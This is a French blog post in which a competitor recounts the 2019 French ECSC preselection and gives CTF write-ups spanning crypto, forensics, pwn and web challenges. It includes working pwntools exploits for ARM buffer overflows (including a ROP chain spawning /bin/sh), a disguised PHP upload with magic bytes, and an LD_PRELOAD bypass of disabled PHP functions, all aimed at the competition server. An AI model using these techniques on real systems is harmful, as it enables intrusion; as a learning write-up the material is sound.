+++

date = "2019-06-12T04:05:25-06:00"
draft = false
title = "[FR] - Présélection Française pour l'ECSC 2019"

+++

Le lundi 13 au mercredi 22 mai 2019 s'est déroulé les phase de présélection nationale pour l'European Cybersecurity challenge (ECSC). Près de 1 200 candidats se sont affronté pendant 1 semaine dans l'objectif de représenter la France pour la compétion européenne qui se déroulera à Bucarest.

> Près d’une quarantaine d’épreuves ont été mises en ligne pendant dix jours afin de tester les candidat(e)s, mais aussi les curieux et les curieuses, sur des domaines variés : le web, la cryptographie, reverse, forensic, etc.

> En plus de la résolution des épreuves techniques, les participant(e)s ont également été évalué(e)s sur leur rapidité, le taux d’erreurs ou encore la qualité des write-ups fournis pour expliquer comment ils ou elles ont procédé pour résoudre certaines épreuves.

J'ai décidé de rejoindre la partie et de me confronter à ces épreuves. Malgré l'excellent niveau globale j'ai réussi à me faire une place et me glisser parmis les 25 préséléctionnés de la catégorie sénior (20-25 ans). 
Résultat final 20eme au classement général (soit 14eme de ma catégorie).

<p align="center">
  <img src="/img/blog-ecsc-1/classement.png" />
</p>

### Write ups

J'ai du rédiger la solution de quelques épreuves. J'ai essayé de diversifier les catégories pour donner une vision large.

- [(crypto) 2tp](#2tp)
- [(crypto) CQFD](#cqfd)
- [(forensic) Exfiltration](#exfiltration)
- [(forensic/crypto)CryptoDIY](#crypodiy)
- [(pwn) Armory](#armory)
- [(pwn) Armigo](#armigo)
- [(web) Ceci n'est pas une pipe](#ceci-n-est-pas-une-pipe)

#### 2tp

*2tp est une épreuve à réaliser sur un serveur distant.*

En se connectant au service, on remarque qu’on a à faire à un oracle. Le service prend en entrée un clair et nous retourne le chiffré à la demande. On a également la valeur du chiffré à atteindre pour obtenir le flag.

<p align="center">
  <img src="/img/blog-ecsc-1/2tp.png" />
</p>

En testant avec quelques clairs on se rend compte que le chiffrement est fait caractère par caractère, on a probablement à faire à un One Time Pad (d'ou le nom 2tp...).

Avec une attaque caractère par caractère on obtient assez facilement le mot de passe:

```python
from pwn import ∗

target="7b656d3993152e8f04f8273ca15...8edb8d1964733b"
HOST="challenges.ecsc−teamfrance.fr"
PORT=2000
r=remote(HOST,PORT)
r.recvuntil("text : ")
r.sendline("ECSC{")
cipher=r.recvline("")[25:]
idx=10 # We can start at index=10 as we know the beggining of the flag

a=['a','b','c','d','e','f','0','1','2','3','4','5','6','7','8','9']
flag="ECSC{"
while idx < 125:
	i=0
	while(target[idx] != cipher[idx]) or (target[idx+1] != cipher[idx+1]):
		r=remote(HOST,PORT)
		r.recvuntil("text : ")
		print(flag + a[i])
		r.sendline(flag + a[i])
		c=r.recvline ("")[25:]
		i+=1
		if(i>16):
			print("FAIL")
			break
	flag+=a[i−1]
	idx+=2

print(flag)
```

#### CQFD

*CQFD est une épreuve qui repose sur une capture réseau.*

La première partie est une épreuve de reconnaissance, il faut isoler ce qui nous intéresse dans cette capture. On se trouve dans la catégorie cryptographie on sait donc déjà un peu vers ou regarder.

Dans la capture réseau on remarque 2 certificats autosignés pour les domaines __iluvprimes.fr__ et __cryptoftw.fr__. On a également une communication avec le vrai certificat de l’ANSSI. On regarde un peu les paramètres utilisés dans les échanges TLS. En regardant chaque certificat individuellement rien ne me saute à l’oeil, les paramètres sont bon (RSA-2048 et les modules ont l’air normaux). Pour dechiffrer le flux, il nous faudra d’une manière ou d'une autre récuperer la clé privée. Ici je ne voyais pas d’autres méthodes que factoriser le module de la clé publique. Le problème est qu'une clé 2048 bits ne se factorise pas directement en un temps résonnable. 

On peut donc essayer de trouver des facteurs communs avec d’autres certificats (en pratique des millions qu'on pourrait trouver sur internet), mais ici commençons déjà avec nos 2 certificats suspects présents dans la capture. On copie les modules des 2 certificats suspects, notons les *N1* et *N2*, puis on cherche le plus grand diviseur commun: *pgcd(N1,N2)*.

On obtient un facteur commun notons le p. On déduit *q1=N1/p* et *q2=N2/p*. On a désormais tout pour reconstruire les clés RSA et finaliser le challenge.

```python
import RSATool

n1=0x65e38a08e4edc740c8cc92dbb09d59d...
n2=0x008f029166fdf2a6b454999af085548...

q2=1764579966974465417970784106817...
q1=12571913870578412398184776010735...

p=10230958225226572772534034545146...
e=65537

print("Construct private key")
tool = RSATool.RSATool()
key1 = tool.generatePrivKey(n1, e, p1 ,q, "cryptoftw.priv.key")
key2 = tool.generatePrivKey(n2, e,p2 ,q, "luvprimes.priv.key")
```
#### Exfiltration
*Exfiltration est une épreuve qui répose sur une capture réseau*

On sait qu'on a à faire à une exfiltration de données, on va l'analyser à l'aide de wireshark. On fouille un peu dans la capture, les différents protocoles et les différentes IP.

On remarque des payload étranges reçu en HTTP qui contiennent un certain :

```
Panel -> malware successfuly installed.
```

On filtre le flux par IP et on comprend la procédure d'exfiltration.

+ Une salve de messages ICMP qui contiennent des métadonnées sur le fichier à exfiltrer: la taille, le nom, l'identifiant ainsi que l'algorithme utilisé pour le chiffrement.

<p align="center">
  <img src="/img/blog-ecsc-1/exfiltration.png" />
</p>

+ Une série de HTTP POST avec identifiant, et payload chiffré.

<p align="center">
  <img src="/img/blog-ecsc-1/exfiltration2.png" />
</p>

On script tout ça, on s'assure qu'il y'a qu'un seul identifiant utilisé puis on extrait tout les payloads. Le chiffrement utilisé est un xor on retrouve facilement le masque, en effet à plusieurs reprises on remarque les bytes __65637363__ soit __"ECSC"__ en hexadécimal.


```python
from scapy.all import *

packets = rdpcap("exfiltration.pcap")
sessions = packets.sessions()
full=""

for i in packets:
  if i[IP].src == "192.168.1.26" and i[IP].dst == "198.18.0.10":
    if "Raw" in i[IP]:
      if 'data=' in i[IP][Raw].load:
        data = i[IP][Raw].load.split("data")[1][1::].split("&")[0]
        full+=data

file1 = bytearray.fromhex(full)
mask = bytearray.fromhex("65637363"*9000) # ECSC

q = open('mask.txt','wb') 
q.write(mask)
q.close()

size = len(file1)
result=(bytearray(size))
for i in range(size):
	result[i]= file1[i] ^ mask[i]

z = open("final.docx", "wb")
z.write(result)
z.close()
```

#### CryptoDIY
*CryptoDIY est une archive ZIP*

On commence par décompresser l’archive ZIP. On remarque une archive de mail au format mbox, en cherchant sur internet on trouve une extension thunderbird qui permet nous permet d’afficher les mails correctement.

Dans les mails on a une discussion de 2 personnes qui désirent s’echanger un ﬁchier avec un mecanisme cryptographique "revolutionnaire" fait maison. On a le code ainsi que quelques paramètres pour chiffrer des ﬁchiers, le but est de dechiffrer le ﬁchier envoyé par la 2eme personne. On a également quelques indices sur le mecanisme de dechiffrement dans le mail.

> un théoreme asiatique et une histoire de factorisation.

__Extrait du code :__

```python
#Public keys
#N=p*q with primes p and q that are part of my secret key
N=53631231719770388398296099992... 

#g1=g^(r1*(p-1)) mod N where r1 is a secret random
g1=27888419610931008932601664194...
#g2=g^(r2*(q-1)) mod N where r2 is a secret random
g2=48099264739307394087061906063...


import random
def encipher(m,g1,g2,N):
    s1 = random.randrange(2**127,2**128)
    s2 = random.randrange(2**127,2**128)
    return (m*pow(g1,s1,N))%N, (m*pow(g2,s2,N))%N
```

L'objectif est de récuperer m à partir de ces paramètres et cet algorithme de chiffrement.
Déjà il serait intéressant de récuper *p,q* vu qu'ils font partie de la clé.
On commence par factoriser *N* (on peut trouver les facteurs directement dans des bases de données en ligne). Il faut maintenant distinguer qui est *p* et qui est *q* parmis nos 2 facteurs comme le code les utilise d'une façon établie.

Pour cela il faut se replonger un peu de le monde de l'arithmétique.

On rappelle le petit théoreme de fermat:

<p align="center">
  <img src="/img/blog-ecsc-1/equa1.png" />
</p>

qui est un cas particulier du théorème de Euler:

<p align="center">
  <img src="/img/blog-ecsc-1/equa2.png" />
</p>


en appliquant le petit théoreme de fermat on se met d'accord sur p et q car

<p align="center">
  <img src="/img/blog-ecsc-1/equa3.png" />
</p>

soit

<p align="center">
  <img src="/img/blog-ecsc-1/equa4.png" />
</p>

Apres factorisation et identification on a donc 

```python
p = 1157920892373...
q = 4631683569492...
```

On a pu récuperer tout les paramètres de la clé, intéressons nous maintenant au processus de chiffrement:
```python
c1 = (m*pow(g1,s1,N))%N
c2 = (m*pow(g2,s2,N))%N
```

En utilisant l'indice on se doute qu'on doit utiliser le théoreme des restes chinois pour identifier notre clair m en fonction de c1 et c2.

On rappelle le théoreme des reste chinois:

<p align="center">
  <img src="/img/blog-ecsc-1/equa5.png" />
</p>

par le petit théoreme de fermat on part de:

<p align="center">
  <img src="/img/blog-ecsc-1/equa6.png" />
</p>

idem pour g2

<p align="center">
  <img src="/img/blog-ecsc-1/equa7.png" />
</p>

on applique le théoreme des restes chinois on a:

<p align="center">
  <img src="/img/blog-ecsc-1/equa8.png" />
</p>

avec

<p align="center">
  <img src="/img/blog-ecsc-1/equa9.png" />
</p>

et 

<p align="center">
  <img src="/img/blog-ecsc-1/equa10.png" />
</p>

fin du formalisme ! On écrit ça en python et on obtient la fonction de dechiffrement (avec utilisation de sageMath):
```python
def decipher(c1,c2,p,q,N):
    INV1 = inverse_mod(q, p)
    INV2 = inverse_mod(p, q)
    m = (c1 * q * INV1 + c2 * p * INV2)% N # CRT
    return m
```
Plus qu'à utiliser notre nouvelle fonction et lancer le script:

```python
cipherbit = open(sys.argv[1], 'rb')
cipher = cipherbit.readlines()
cipher_p = [ i[:-1] for i in cipher]
cipherbit.close()

plain = open(sys.argv[1]+'.plain', 'w')

i = 0
# i+2 comme il y'a 2 blocs de chiffre pour un seul clair
while i < len(cipher_p):
    c1 = int(cipher_p[i])
    c2 = int(cipher_p[i+1])
    m = decipher(c1,c2,p,q,N)
    m2 = format(m,"x")
    padd = len(m2)
    m3 = "0"*(128-padd) + m2
    b = bytearray.fromhex(m3)
    plain.write(b)
    i+=2

plain.close()
```
On déchiffre le fichier et on obtient une vidéo MP4 d'une musique asiatique. On regarde les métadonnées, on a une chaine en base64 qu'on peut décoder qui nous donne le format du flag (nom de la musique en minuscule).

J'ai utilisé shazam "I am the best" !

#### Armory

*Armigo est un executable ELF / ARM 32 bits*

Il n'y a pas de sécurités vraiment bloquantes activées sur le binaire, on le lance avec qemu, on lui passe une longue chaine et on remarque un buffer overflow assez trivial. On peut controller l'adresse de retour. On genere un payload cyclic pour trouver l'offset du point de pivot.

<p align="center">
  <img src="/img/blog-ecsc-1/cyclic.png" />
</p>


En désassemblant le binaire, on remarque une fonction *evil()* à l'addresse __0x1052c__ qui réalise un *system("/bin/sh")*. On a juste à remplacer le point de pivot par cette adresse et le tour est joué.

```python
from pwn import *


evil = "0x1052c"

HOST = "challenges.ecsc-teamfrance.fr"
PORT = 4003

r=remote(HOST,PORT)
payload = "a"*68 + p32(evil)
r.recvuntil("")
r.sendline(payload)
r.interactive()
```
#### Armigo

*Armigo est un executable ELF / ARM 32 bits*

On se trouve dans les memes conditions que pour *Armory*, on retrouve un buffer overflow assez trivial. On peut controller l'adresse de retour. Une fois de plus on peut generer un payload cyclic pour trouver l'offset du point de pivot.

Beaucoup de fonctions sont disponibles dans le binaire on va essayer de les utiliser pour obtenir un shell distant. On recupère les adresses *system*, *exit* et *"bin/sh"*, et on devrait pouvoir les chainer pour creer un ret2libc (du moins c'est comme ça que je ferais sur x86).
Cependant, il y'a une subtilité avec l'ARM, les paramètres passent par registres et non par la pile. L'idée c'est donc de modifier un peu ce concept, on a juste à trouver un gadget qui charge une valeur de la pile dans r0, grace à ca on pourra charger notre chaine  *"/bin/sh"* dans le bon registre et appeler *system*. J'ai utilisé l'outil ROPgadget pour lister les gadgets.

On trouve donc : 
```
0x71134 : ldr    r0, [sp, #12], add  sp, sp, #20
```

Ce gadget charge la valeur à l'offset 12 de la pile dans r0 on a juste à placer "/bin/sh" à +12, ensuite on saute de +20 sur la pile et on continue l'execution.

ça donne une pile comme celle ci:

*gadget + JUNK + JUNK + JUNK + binsh + JUNK + system*

```python
from pwn import *


PORT = 4004 
HOST = "challenges.ecsc-teamfrance.fr" 
r = remote(HOST,PORT)

gadget = p32(0x71134)  # ldr    r0, [sp, #12], add  sp, sp, #20 
system = p32(0x171c4)
bin_sh = p32(0x73844)  # find __libc_start_main,+99999999,"/bin/sh"
JUNK = "AAAA"

payload = "a"*68 + gadget + JUNK + JUNK + JUNK + bin_sh + JUNK + system
r.sendline(payload)
r.interactive()
```

#### Ceci n'est pas une pipe

*Ceci n'est pas une pipe est une plateforme web*

On créer un compte, on se connecte au challenge et on remarque un page qui permet d'uploader des images. Je suspecte que le point d'entrée se trouve ici, je tente d'abord d'uploder des images conformes pour voir comment fonctionne la plateforme.
Les images arrivent dans un dossier spécifique propre à l'utilisateur. Voyons si on peut uploader autre chose que des images...

- un fichier php [fail]
- un fichier php avec le 'contentType' image/jpg [fail]
- un fichier php avec le 'contentType' image/jpg et l'extension.jpg [fail]
- un fichier php avec l'extension.jpg et les magic byte jpeg devant [WIN]

Ok super on a une execution de code sur le serveur (mais ce n'est pas fini)...

je fais un *phpinfo()* pour voir ce qu'il se passe un peu, on a beaucoup de "fonctionDisabled", on va essayer de contourner tout ça.

Une technique assez connu existe et consiste à modifier la variable d'environnement __LDPRELOAD__ avec une librairie qu'on controle puis d'appeler un binaire.
La librairie (qu'on controle) sera chargée en priorité et on pourra executer des commandes sur le serveur directement. Ici c'est possible, en effet les fonctions *putenv()* et *mail()* ne sont pas bloqués.

*putenv()* va servir à modifier la variable d'environnement __LDPRELOAD__, et *mail()* est une façon détourné d'appeler un binaire.
Il existe un outil open source gérant le hook directement (*CHANKRO*)

On genere un payload pour trouver le flag (à base de "*ls*"), il se trouve dans */home/*, on remarque que c'est un executable. On l'execute et on redirige la sortie vers notre dossier perso.

```bash
/home/flag > /www/html/upload/2af487c.../flag.txt
```

puis depuis le site on accede à *www.chall.fr/upload/2af487c.../flag.txt* pour lire le flag.
